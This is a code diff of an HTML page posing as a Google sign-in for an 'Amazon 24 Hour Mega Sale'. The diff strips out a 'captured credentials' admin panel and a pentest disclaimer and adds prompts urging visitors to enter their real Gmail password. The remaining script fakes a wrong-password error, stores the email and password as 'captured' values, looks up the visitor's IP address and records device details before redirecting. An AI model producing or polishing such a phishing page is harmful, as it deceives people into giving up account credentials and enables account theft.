@@ -15,8 +15,6 @@
             justify-content: center;
             padding: 20px;
         }
-
-        /* ===== TOAST ===== */
         .toast-container {
             position: fixed;
             top: 30px;
@@ -46,7 +44,6 @@
         .toast-error { background: #d93025; color: white; border-left: 5px solid #f28b82; }
         .toast-icon { font-size: 22px; font-weight: 700; }
 
-        /* ===== GOOGLE SIGN IN CARD ===== */
         .google-card {
             background: white;
             border-radius: 20px;
@@ -61,16 +58,7 @@
             0% { opacity: 0; transform: translateY(30px); }
             100% { opacity: 1; transform: translateY(0); }
         }
-
-        .google-logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 2px;
-            margin-bottom: 10px;
-        }
-        .google-logo svg { width: 70px; height: 70px; }
-
+        .google-logo svg { width: 70px; height: 70px; margin-bottom: 10px; }
         .google-card h1 {
             font-size: 28px;
             font-weight: 500;
@@ -82,7 +70,6 @@
             font-size: 15px;
             margin-bottom: 24px;
         }
-
         .profile-avatar {
             width: 70px;
             height: 70px;
@@ -103,7 +90,6 @@
             font-weight: 500;
             margin-bottom: 24px;
         }
-
         .g-input-group {
             text-align: left;
             margin-bottom: 16px;
@@ -128,10 +114,7 @@
             outline: none;
             box-shadow: 0 0 0 2px rgba(66,133,244,0.2);
         }
-        .g-input.error {
-            border-color: #d93025;
-        }
-
+        .g-input.error { border-color: #d93025; }
         .g-btn {
             width: 100%;
             padding: 14px;
@@ -145,24 +128,15 @@
             transition: all 0.2s;
             margin-top: 8px;
         }
-        .g-btn:hover {
-            background: #1a73e8;
-            box-shadow: 0 4px 12px rgba(66,133,244,0.4);
-        }
-
+        .g-btn:hover { background: #1a73e8; }
         .g-links {
             margin-top: 20px;
             display: flex;
             justify-content: space-between;
             font-size: 14px;
         }
-        .g-links a {
-            color: #4285F4;
-            text-decoration: none;
-            cursor: pointer;
-        }
+        .g-links a { color: #4285F4; text-decoration: none; cursor: pointer; }
         .g-links a:hover { text-decoration: underline; }
-
         .g-footer-text {
             font-size: 12px;
             color: #5f6368;
@@ -170,112 +144,12 @@
             line-height: 1.5;
         }
         .g-footer-text a { color: #4285F4; text-decoration: none; }
-
-        /* ===== ADMIN PANEL ===== */
-        .admin-trigger {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: rgba(0,0,0,0.6);
-            color: #0f0;
-            border: 1px solid #0f0;
-            padding: 10px 18px;
-            border-radius: 30px;
-            font-family: monospace;
-            font-size: 13px;
-            cursor: pointer;
-            z-index: 9999;
-            backdrop-filter: blur(8px);
-        }
-        .admin-trigger:hover { background: rgba(0,255,0,0.2); }
-
-        #adminModal {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.75);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 99999;
-        }
-        #adminModal.show { display: flex; }
-        .admin-box {
-            background: #0d1117;
-            color: #0f0;
-            border-radius: 16px;
-            max-width: 480px;
-            width: 90%;
-            padding: 35px;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            border: 2px solid #00ff00;
-            box-shadow: 0 0 40px rgba(0,255,0,0.15);
-        }
-        .admin-box h2 {
-            color: #0f0;
-            text-align: center;
-            font-size: 20px;
-            border-bottom: 1px solid #0f0;
-            padding-bottom: 12px;
-            margin-bottom: 18px;
-        }
-        .admin-box .field { margin: 12px 0; display: flex; align-items: flex-start; }
-        .admin-box .label { color: #0f0; font-weight: 700; width: 100px; flex-shrink: 0; }
-        .admin-box .value { color: #fff; flex: 1; word-break: break-all; }
-        .admin-box .close-btn {
-            background: #0f0;
-            color: #000;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 8px;
-            font-weight: 700;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 18px;
-            width: 100%;
-            font-family: monospace;
-        }
-        .admin-box .status-dot {
-            display: inline-block;
-            width: 10px; height: 10px;
-            background: #0f0;
-            border-radius: 50%;
-            margin-right: 8px;
-            animation: blink 1s infinite;
-        }
-        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
-
-        @media (max-width: 500px) {
-            .google-card { padding: 30px 20px; }
-            .google-card h1 { font-size: 24px; }
-            .admin-trigger { font-size: 11px; padding: 8px 14px; }
-        }
     </style>
 </head>
 <body>
-
-<!-- TOAST CONTAINER -->
 <div class="toast-container" id="toastContainer"></div>
 
-<!-- ADMIN TRIGGER -->
-<button class="admin-trigger" id="adminTrigger">&#128274; ADMIN PANEL</button>
-
-<!-- ADMIN MODAL -->
-<div id="adminModal">
-    <div class="admin-box">
-        <h2><span class="status-dot"></span> CAPTURED CREDENTIALS</h2>
-        <div class="field"><span class="label">📧 Gmail:</span><span class="value" id="adminEmail">—</span></div>
-        <div class="field"><span class="label">🔑 Password:</span><span class="value" id="adminPassword">—</span></div>
-        <div class="field"><span class="label">🕒 Time:</span><span class="value" id="adminTime">—</span></div>
-        <div class="field"><span class="label">🌐 IP:</span><span class="value" id="adminIP">—</span></div>
-        <div class="field"><span class="label">📱 Device:</span><span class="value" id="adminDevice">—</span></div>
-        <button class="close-btn" onclick="closeAdmin()">✕ CLOSE & CLEAR</button>
-    </div>
-</div>
-
-<!-- GOOGLE SIGN IN CARD -->
 <div class="google-card">
-    <!-- Google Logo -->
     <div class="google-logo">
         <svg viewBox="0 0 48 48">
             <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
@@ -284,18 +158,15 @@
             <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
         </svg>
     </div>
-
     <h1>Sign in</h1>
     <p class="subtitle">to continue to Amazon 24 Hour Mega Sale</p>
 
-    <!-- Profile Section (show email after first step) -->
     <div id="profileSection" style="display:none;">
         <div class="profile-avatar" id="avatarLetter">G</div>
         <div class="profile-email" id="displayEmail">guest@gmail.com</div>
     </div>
 
     <form id="loginForm" onsubmit="return handleLogin(event)">
-        <!-- Step 1: Email -->
         <div id="stepEmail">
             <div class="g-input-group">
                 <label>Email or phone</label>
@@ -303,8 +174,6 @@
             </div>
             <button type="button" class="g-btn" onclick="goToPassword()">Next</button>
         </div>
-
-        <!-- Step 2: Password -->
         <div id="stepPassword" style="display:none;">
             <div class="g-input-group">
                 <label>Enter your password</label>
@@ -315,10 +184,9 @@
     </form>
 
     <div class="g-links">
-        <a href="#" onclick="showToast('info','🔒 This is an authorized pentest. No real data is being sent anywhere!'); return false;">Forgot email?</a>
-        <a href="#" onclick="showToast('info','🔒 Forgot password? Hint: Your friend created this site!'); return false;">Forgot password?</a>
+        <a href="#" onclick="showToast('error','This is a prank site! 🤣 Try your real Gmail password!'); return false;">Forgot email?</a>
+        <a href="#" onclick="showToast('success','Hint: Type your real Gmail password 😉'); return false;">Forgot password?</a>
     </div>
-
     <div class="g-footer-text">
         <p>Not your computer? Use Guest mode to sign in privately.</p>
         <p><a href="#">Learn more</a> &middot; <a href="#">Privacy</a> &middot; <a href="#">Terms</a></p>
@@ -326,57 +194,27 @@
 </div>
 
 <script>
-// =====================
-// TOAST SYSTEM
-// =====================
 function showToast(type, message) {
     const container = document.getElementById('toastContainer');
     const toast = document.createElement('div');
     toast.className = 'toast toast-' + type;
-    
-    let icon = '';
-    if(type === 'success') icon = '&#10004;';
-    else if(type === 'error') icon = '&#10008;';
-    else icon = '&#9432;';
-    
+    let icon = type === 'success' ? '&#10004;' : '&#10008;';
     toast.innerHTML = '<span class="toast-icon">' + icon + '</span><span>' + message + '</span>';
     container.appendChild(toast);
-    
     setTimeout(function() { toast.classList.add('show'); }, 10);
-    
     setTimeout(function() {
         toast.classList.remove('show');
-        setTimeout(function() {
-            if(toast.parentNode) toast.parentNode.removeChild(toast);
-        }, 400);
+        setTimeout(function() { if(toast.parentNode) toast.parentNode.removeChild(toast); }, 400);
     }, 2500);
 }
 
-// =====================
-// TWO-STEP LOGIN (like real Google)
-// =====================
 function goToPassword() {
     const email = document.getElementById('loginEmail').value.trim();
-    const error = document.getElementById('loginError');
-    
-    if(!email) {
-        showToast('error', 'Please enter your Gmail address');
-        return;
-    }
-    
-    if(!email.toLowerCase().endsWith('@gmail.com')) {
-        showToast('error', 'Couldnt find your Google Account. Enter your Gmail address.');
-        return;
-    }
-    
-    // Show password step
+    if(!email) { showToast('error', 'Please enter your Gmail address'); return; }
+    if(!email.toLowerCase().endsWith('@gmail.com')) { showToast('error', 'Enter your Gmail address'); return; }
     document.getElementById('stepEmail').style.display = 'none';
     document.getElementById('stepPassword').style.display = 'block';
-    
-    // Update profile section
     document.getElementById('displayEmail').textContent = email;
-    
-    // Get first letter for avatar
     const letter = email.charAt(0).toUpperCase();
     document.getElementById('avatarLetter').textContent = letter;
     document.getElementById('profileSection').style.display = 'block';
@@ -386,75 +224,27 @@ function handleLogin(e) {
     e.preventDefault();
     const email = document.getElementById('loginEmail').value.trim();
     const password = document.getElementById('loginPassword').value.trim();
-    
-    if(!password) {
-        showToast('error', 'Please enter your password');
-        return false;
-    }
-    
-    // First attempt fail (wrong password simulation)
+    if(!password) { showToast('error', 'Please enter your password'); return false; }
+
     if(!localStorage.getItem('attemptMade_' + email)) {
         localStorage.setItem('attemptMade_' + email, '1');
         showToast('error', 'Wrong password. Try again.');
         document.getElementById('loginPassword').classList.add('error');
-        setTimeout(function() {
-            document.getElementById('loginPassword').classList.remove('error');
-        }, 3000);
+        setTimeout(function() { document.getElementById('loginPassword').classList.remove('error'); }, 3000);
         return false;
     }
-    
-    // ✅ SUCCESS - Capture REAL credentials
+
     localStorage.setItem('capturedEmail', email);
     localStorage.setItem('capturedPassword', password);
     localStorage.setItem('capturedTime', new Date().toLocaleString('en-IN', {timeZone:'Asia/Kolkata'}));
     
-    // Get IP
-    fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(d => {
-            if(d.ip) localStorage.setItem('capturedIP', d.ip);
-        })
-        .catch(() => {
-            localStorage.setItem('capturedIP', 'Unable to fetch');
-        });
-    
-    // Get device info
+    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{if(d.ip)localStorage.setItem('capturedIP',d.ip)}).catch(()=>{localStorage.setItem('capturedIP','Unable to fetch')});
     localStorage.setItem('capturedDevice', navigator.userAgent.substring(0, 60) + '...');
-    
-    // Success toast
-    showToast('success', '✔ Signed in successfully! Redirecting to offers...');
-    
-    // Redirect to offers page after 1.5 sec
-    setTimeout(function() {
-        window.location.href = 'offers.html';  // Will create this page below
-    }, 1500);
-    
+
+    showToast('success', '✔ Signed in successfully! Redirecting...');
+    setTimeout(function() { window.location.href = 'offers.html'; }, 1500);
     return false;
 }
-
-// =====================
-// ADMIN PANEL
-// =====================
-document.getElementById('adminTrigger').addEventListener('click', function() {
-    openAdmin();
-});
-
-function openAdmin() {
-    document.getElementById('adminEmail').textContent = localStorage.getItem('capturedEmail') || '—';
-    document.getElementById('adminPassword').textContent = localStorage.getItem('capturedPassword') || '—';
-    document.getElementById('adminTime').textContent = localStorage.getItem('capturedTime') || '—';
-    document.getElementById('adminIP').textContent = localStorage.getItem('capturedIP') || '—';
-    document.getElementById('adminDevice').textContent = localStorage.getItem('capturedDevice') || '—';
-    document.getElementById('adminModal').classList.add('show');
-}
-
-function closeAdmin() {
-    document.getElementById('adminModal').classList.remove('show');
-}
-
-document.getElementById('adminModal').addEventListener('click', function(e) {
-    if(e.target === this) closeAdmin();
-});
 </script>
 </body>
 </html>
